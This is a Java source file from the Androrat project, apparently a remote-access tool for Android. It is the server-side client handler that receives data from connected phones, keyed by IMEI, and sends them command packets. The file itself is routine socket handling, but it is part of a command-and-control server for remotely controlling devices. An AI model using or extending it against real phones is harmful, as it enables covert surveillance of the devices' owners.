/*
  Part of the Androrat project - https://github.com/RobinDavid/androrat

  Copyright (c) 2012 Robin David

  This library is free software; you can redistribute it and/or
  modify it under the terms of the GNU Lesser General Public
  License as published by the Free Software Foundation, version 3.

  This library is distributed in the hope that it will be useful,
  but WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
  Lesser General Public License for more details.

  You should have received a copy of the GNU Lesser General
  Public License along with this library; if not, write to the
  Free Software Foundation, Inc., 59 Temple Place, Suite 330,
  Boston, MA  02111-1307  USA
*/
package server;

import java.io.DataOutputStream;
import java.io.IOException;
import java.net.Socket;
import java.net.SocketException;
import java.nio.ByteBuffer;
import java.nio.channels.SocketChannel;

import gui.GUI;
import inout.Protocol;
import Packet.CommandPacket;
import Packet.Packet;

import in.Demux;
import in.Receiver;
import out.Mux;

public class ClientHandler extends Thread {
	private String imei;
	private Socket clientSocket;
	private Receiver receiver;
	private Server server;
	private Demux demux;
	private Mux mux;
	private ByteBuffer buffer;
	private boolean connected;
	private GUI mainGUI;

	public ClientHandler(Socket your_socket, String id, Server s, GUI mainGUI)
			throws IOException {
		this.mainGUI = mainGUI;
		server = s;
		imei = id;
		clientSocket = your_socket;
		receiver = new Receiver(clientSocket);
		demux = new Demux(server, imei);
		mux = new Mux(new DataOutputStream(clientSocket.getOutputStream()));
		connected = true;
		buffer = ByteBuffer.allocate(Protocol.MAX_PACKET_SIZE);
		buffer.clear();

	}

	// attend des donn�es du Receiver et les transmet au Demultiplexeur
	public void run() {
		while (connected) {

			try {
				
			     //System.out.println("");
				
				//buffer = receiver.read();
			     buffer = receiver.read(buffer);
			     
				try {
					if (demux.receive(buffer)) {
						//System.out.println("Restant: "+buffer.remaining()+" Position: "+buffer.position()+" Limit: "+buffer.limit());
						buffer.compact();
					}
				} catch (Exception e) {
					connected = false;
					/*
					connected = false;
					try {
						clientSocket.close();
						mainGUI.deleteUser(imei);
						
					} catch (IOException e1) {
					}*/
					server.getGui().logErrTxt("ERROR: while deconding received stream (Demux) : "+e.getCause());
				}

			}
			catch (IOException e) {
				connected = false;
				try {
					
					clientSocket.close();
					mainGUI.deleteUser(imei);
				} catch (IOException e1) {
					server.getGui().logErrTxt("ERROR: while reading from a socket(Receiver)");
				}
			}
			catch(IndexOutOfBoundsException e) {
				server.getGui().logErrTxt("Client ended gently !");
				connected = false;
				try {
					clientSocket.close();
					mainGUI.deleteUser(imei);
				} catch (IOException e1) {
					server.getGui().logErrTxt("Cannot close socket when socket client closed it before");
				}
			}
		}
		server.DeleteClientHandler(imei);
	}

	// transmet les donn�es � envoyer au Multiplexeur
	public void toMux(short command, int channel, byte[] args) {
		Packet packet = new CommandPacket(command, channel, args);
		mux.send(0, packet.build());

		//server.getGui().logTxt("Request sent :" + command + ",on the channel "+ channel);


	}

	public void updateIMEI(String i) {
		imei = i;
		demux.setImei(imei);
	}

}
